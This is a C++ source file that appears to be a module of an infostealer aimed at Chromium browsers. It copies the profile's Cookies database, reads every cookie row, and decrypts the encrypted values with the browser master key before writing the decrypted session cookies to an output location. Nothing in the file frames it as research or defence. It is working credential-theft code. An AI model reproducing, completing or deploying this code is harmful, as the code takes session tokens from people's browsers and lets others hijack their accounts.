//
// Created by .1qxz on 09.06.2024.
//

#include "CCookies.h"

void CCookies::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Network" / "Cookies";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> cookies;

    SQLiteUtil::connectAndRead(R"(
            SELECT host_key, name, value, encrypted_value, path, expires_utc
            FROM cookies
    )", copied_db, [this, &cookies](sqlite3_stmt *stmt) {
        auto cookieRecord = std::make_unique<Cookie>();
        cookieRecord->host_key = SQLiteUtil::readString(stmt, 0);
        cookieRecord->name = SQLiteUtil::readString(stmt, 1);
        cookieRecord->path = SQLiteUtil::readString(stmt, 4);
        cookieRecord->expires_utc = SQLiteUtil::readLong64(stmt, 5);

        std::vector<BYTE> master_key = this->getMasterKey();
        std::string decoded_value = ChromiumUtil::decryptData(SQLiteUtil::readBytes(stmt, 3), master_key);

        cookieRecord->value = decoded_value;

        if(decoded_value.empty())
            cookieRecord->value = SQLiteUtil::readString(stmt, 2);

        cookies.push_back(std::move(cookieRecord));
    });

    fs::remove(copied_db);
    Entity::writeSelf(root, cookies, false);
}
